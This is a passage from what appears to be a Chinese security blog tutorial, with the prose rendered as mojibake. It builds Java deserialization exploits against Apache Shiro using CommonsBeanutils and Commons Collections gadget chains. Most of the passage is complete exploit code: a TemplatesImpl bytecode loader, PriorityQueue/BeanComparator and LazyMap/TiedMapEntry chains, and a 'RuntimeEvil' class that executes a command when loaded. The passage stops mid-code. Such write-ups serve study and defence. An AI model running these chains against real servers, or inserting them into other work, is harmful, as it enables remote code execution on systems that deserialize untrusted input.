srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¾æ—§ç”¨PriorityQueue.siftDownUsingComparatoré“¾ä¸Šï¼Œåé¢å°±å’ŒCC2ä¸€æ ·äº†ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175123345.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175123345.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroAttackCB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>)));</span><br><span class="line">        priorityQueue.add(templatesClass);</span><br><span class="line">        priorityQueue.add(templatesClass);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">compareField</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        compareField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        compareField.set(priorityQueue,beanComparator);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175759529.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175759529.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="CCé“¾"><a href="#CCé“¾" class="headerlink" title="CCé“¾"></a>CCé“¾</h2><p>å°±ç®—æœåŠ¡å™¨æœ‰CCä¾èµ–ï¼ˆå¯èƒ½æ˜¯ä¸šåŠ¡å¼€å‘éœ€è¦ï¼‰ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦è¿›è¡Œä¿®æ”¹æ‰èƒ½åˆ©ç”¨ã€‚</p><blockquote><p>shiro<strong>å¦‚æœååºåˆ—åŒ–æµä¸­åŒ…å«éJavaè‡ªèº«çš„æ•°ç»„ï¼Œåˆ™ä¼šå‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯</strong></p><p>åŸç†è§<a href="https://daidaitiehanhan.github.io/2022/04/26/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E4%B8%83)-%E5%85%B3%E4%BA%8EShiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8Cyso%E4%B8%ADCC%E9%93%BE%E8%BF%99%E4%BB%B6%E4%BA%8B/">https://daidaitiehanhan.github.io/2022/04/26/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E4%B8%83)-%E5%85%B3%E4%BA%8EShiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8Cyso%E4%B8%ADCC%E9%93%BE%E8%BF%99%E4%BB%B6%E4%BA%8B/</a></p><p><a href="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802170805620.png"></a></p></blockquote><p>æˆ‘ä»¬åœ¨shiroé¡¹ç›®web.xmlä¸­æ‰‹åŠ¨åŠ ä¸ŠCC3.2.1çš„ä¾èµ–ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806164207492.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806164207492.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>3.2.1ç‰ˆæœ¬ï¼Œå°±ä¸èƒ½ç”¨TransformingComparatorï¼Œä¸ç”¨Transformeræ•°ç»„ï¼Œå°±æ˜¯ä¸ç”¨chainedTransformerã€‚ä¹Ÿå°±æ˜¯ä¸èƒ½åå°„è°ƒç”¨Runtimeï¼Œåªèƒ½é€‰æ‹©åŠ è½½å­—èŠ‚ç ã€‚</p><p>é‚£å°±æ˜¯æƒ³åŠæ³•è§¦å‘ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//æ„é€ æ¶æ„å­—èŠ‚ç </span></span><br><span class="line">templatesClass.newTransformer()</span><br></pre></td></tr></table></figure><p>ç­‰äºè§¦å‘ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">invokerTransformer.transform(templatesClass)</span><br></pre></td></tr></table></figure><p>å›°éš¾ç‚¹å°±åœ¨äºä»¥å‰æˆ‘ä»¬éƒ½æ˜¯chainedTransformeré“¾å¼è°ƒç”¨transformï¼Œèµ·å§‹çš„transformå‚æ•°éƒ½æ˜¯ç”¨ConstantTransformerä¼ çš„ï¼Œè‡ªå·±å¾ˆéš¾æ§åˆ¶ã€‚</p><p>æˆ‘ä»¬æ¢³ç†ä¸€ä¸‹CC6çš„è°ƒç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6TiedMapEntry</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize(&quot;cc6.ser&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()-&gt;hash()-&gt;</span><br><span class="line">    TiedMapEntry.hashCode()-&gt;getValue()-&gt;</span><br><span class="line">    LazyMap.get()-&gt;</span><br><span class="line">    chainedTransformer.transform()</span><br></pre></td></tr></table></figure><p>åœ¨HashMap.putæ·»åŠ TiedMapEntryæ—¶ï¼Œè§¦å‘äº†hash()ï¼Œæ‰€ä»¥å…ˆLazyMapç»‘å®šçš„å¸¸é‡ConstantTransformerã€‚</p><p>è€Œä¸”hashMap.putæ—¶ï¼Œè°ƒç”¨è‡³TiedMapEntry.getValue()-&gt;LazyMap.getï¼ŒæŠŠTiedMapEntryå½“å‰çš„keyå’Œtransformçš„ç»“æœputè¿›mapäº†ï¼Œä¹Ÿå°±æ˜¯test1ã€‚ç¬¬äºŒæ¬¡å°±ä¸ä¼šè¿›ifï¼Œæ‰€ä»¥payload removeäº†è¯¥é”®ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806144728449.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806144728449.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806144522352.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806144522352.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ³¨æ„åˆ°æ²¡æœ‰ï¼Œè¿™é‡Œtransformçš„å‚æ•°å°±æ˜¯æˆ‘ä»¬new TiedMapEntryæ—¶ä¼ å…¥çš„å‚æ•°test1ã€‚ç°åœ¨æˆ‘ä»¬ä¼ templatesClassï¼Œåˆ†åˆ«åœ¨putæ—¶è§¦å‘ä¸€æ¬¡ï¼Œååºåˆ—åŒ–æ—¶è§¦å‘ä¸€æ¬¡ã€‚</p><p>æ‰€ä»¥transformçš„å‚æ•°æ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚</p><p>çŸ¥é“è¿™ä¸€ç‚¹å°±å¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬ç›´æ¥æ„é€ ä»¥ä¸‹é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()-&gt;hash()-&gt;</span><br><span class="line">    TiedMapEntry.hashCode()-&gt;getValue()-&gt;</span><br><span class="line">    LazyMap.get()-&gt;</span><br><span class="line">    InvokerTransformer.transform()-&gt;</span><br><span class="line">    TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸ªRuntimeEvilæ¶æ„å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeEvil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RuntimeEvil</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”ŸæˆCC6å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shiroNoArrayCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span 